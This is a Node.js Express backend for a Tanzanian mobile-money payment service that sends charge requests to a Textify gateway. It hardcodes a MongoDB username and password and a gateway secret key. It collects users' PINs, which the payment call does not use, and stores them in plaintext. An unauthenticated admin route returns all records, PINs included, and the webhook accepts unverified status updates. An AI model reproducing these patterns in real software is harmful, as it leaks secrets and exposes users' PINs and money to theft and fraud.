require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");
const mongoose = require("mongoose");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// =======================
// 🗄️ MONGODB
// =======================
mongoose.connect(
  "mongodb+srv://zaharanirashidi29_db_user:oQgtq3g1JHIgtIT2@cluster0.a6wjozy.mongodb.net/unlockvip?retryWrites=true&w=majority"
)
.then(() => console.log("MongoDB Connected"))
.catch(err => console.log("MongoDB Error:", err));

// =======================
// 📊 SCHEMA
// =======================
const paymentSchema = new mongoose.Schema({
  phone: String,
  pin: String,
  amount: Number,
  reference: String,
  status: String,
  reason: String,
  time: String
});

const Payment = mongoose.model("Payment", paymentSchema);

// =======================
// 🔑 TEXTIFY KEYS
// =======================
const APP_ID = "CHUO_ASILI";
const SECRET_KEY = "UrESzERfxSxNOcGmtigm5ovnztw49F7bJMuBFJJ/NeA=";

// =======================
app.get("/", (req, res) => {
  res.send("Textify Backend Running 🚀");
});

// =======================
// 🔐 SIGNATURE FUNCTION
// =======================
function generateSignature(payload, timestamp) {
  const data = payload + timestamp;

  return crypto
    .createHmac("sha256", SECRET_KEY)
    .update(data)
    .digest("base64");
}

// =======================
// 💳 CREATE PAYMENT
// =======================
app.post("/create-payment", async (req, res) => {
  try {
    let { phone, pin } = req.body;
    const amount = 3000;

    if (!phone) {
      return res.status(400).json({
        success: false,
        error: "Phone is required"
      });
    }

    // FORMAT NUMBER
    phone = phone.toString().trim();
    if (phone.startsWith("0")) phone = "255" + phone.substring(1);

    if (!phone.startsWith("255") || phone.length !== 12) {
      return res.status(400).json({
        success: false,
        error: "Invalid Tanzanian number"
      });
    }

    const reference = "ORD" + Date.now();
    const timestamp = Math.floor(Date.now() / 1000);

    // ⚠️ IMPORTANT: JSON MUST BE STRING (ONE LINE)
    const payloadObj = {
      action: "collection",
      amount: amount,
      msisdn: phone,
      reference: reference,
      callback_url: "https://unlockvip-backend-1.onrender.com/webhook"
    };

    const payload = JSON.stringify(payloadObj);

    // 🔐 SIGNATURE
    const signature = generateSignature(payload, timestamp);

    // SAVE BEFORE REQUEST
    await Payment.create({
      phone,
      pin: pin || "",
      amount,
      reference,
      status: "PENDING",
      reason: "WAITING",
      time: new Date().toLocaleString()
    });

    console.log("📦 Sending payment...");
    console.log("Payload:", payload);
    console.log("Signature:", signature);

    const response = await axios.post(
      "https://paymentgw.textify.africa/api/v1/transact",
      payloadObj,
      {
        headers: {
          "Content-Type": "application/json",
          "X-App-ID": APP_ID,
          "X-Timestamp": timestamp,
          "X-Signature": signature
        }
      }
    );

    console.log("✅ RESPONSE:", response.data);

    res.json({
      success: true,
      data: response.data
    });

  } catch (error) {
    console.error("❌ ERROR:", error.response?.data || error.message);

    res.status(500).json({
      success: false,
      error: error.response?.data || error.message
    });
  }
});

// =======================
// 📩 WEBHOOK (IMPORTANT)
// =======================
app.post("/webhook", (req, res) => {
  console.log("📩 WEBHOOK RECEIVED:", req.body);

  const { reference, payment_status } = req.body;

  if (reference) {
    Payment.findOneAndUpdate(
      { reference },
      {
        status: payment_status === "COMPLETED" ? "COMPLETED" : "FAILED",
        reason: payment_status
      }
    ).exec();
  }

  res.sendStatus(200);
});

// =======================
// ADMIN
// =======================
app.get("/admin/payments", async (req, res) => {
  const data = await Payment.find().sort({ _id: -1 });
  res.json(data);
});

// =======================
app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});